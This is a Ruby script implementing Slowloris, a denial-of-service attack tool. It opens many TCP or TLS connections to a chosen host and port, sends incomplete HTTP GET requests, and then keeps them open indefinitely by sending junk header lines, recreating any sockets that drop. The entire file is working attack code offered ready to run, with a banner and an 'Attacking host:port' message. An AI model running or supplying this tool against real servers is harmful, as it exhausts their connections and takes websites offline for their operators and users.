require 'socket'
require 'openssl'
require 'paint'
require './utils/parse_argv'
require './utils/user_agents'

SSLSocket = OpenSSL::SSL::SSLSocket

$options = parse_argv

LOGO = <<'EOF'
 ____  _               _            _     
/ ___|| | _____      _| | ___  _ __(_)___ 
\___ \| |/ _ \ \ /\ / / |/ _ \| '__| / __|
 ___) | | (_) \ V  V /| | (_) | |  | \__ \
|____/|_|\___/ \_/\_/ |_|\___/|_|  |_|___/
EOF

def init_socket
  s = Socket.tcp($options[:host], $options[:port]) 
  s = SSLSocket.new(s).tap { |ssl| ssl.connect } if $options[:https?]
  s.print "GET /?#{rand(2000)} HTTP/1.1\r\n"
  if $options[:https?]
    s.print "User-Agent: #{USER_AGENTS.sample}\r\n"
  else
    s.print "User-Agent: #{USER_AGENTS.first}\r\n"
  end
  s.print "Accept-language: en-US,en,q=0.5\r\n"
  s
end

begin
  sockets      = []
  host         = $options[:host]
  port         = $options[:port]
  socket_count = $options[:socketcount]
  sleeptime    = $options[:sleeptime]

  puts Paint[LOGO, :green]
  puts "Attacking #{host}:#{port} with #{socket_count} sockets"
  puts "Creaing sockets...\n"

  1.upto(socket_count) do |socket_number|
    puts "Creating socket number #{Paint[socket_number, :green]}"
    sockets << init_socket
  rescue SocketError => e
    puts e
    break
  end

  loop do
    puts "Sending keep-alive headers... Socket count: #{sockets.size}"
    sockets.each_with_index do |socket, i|
      socket.print "X-a: #{rand(1..5000)}\r\n"
    rescue Exception
      sockets.delete_at(i)
    end
    missing_sockets = socket_count - sockets.size
    
    missing_sockets.times do
      puts Paint["Recreating socket...", :yellow]
      sockets << init_socket
    rescue SocketError => e
      puts e
      break
    end
    puts "Sleeping for #{sleeptime} seconds"
    sleep(sleeptime)
  end
rescue Interrupt, SystemExit
    puts "\n" + Paint["Stopping Slowloris", :red]
  exit
end
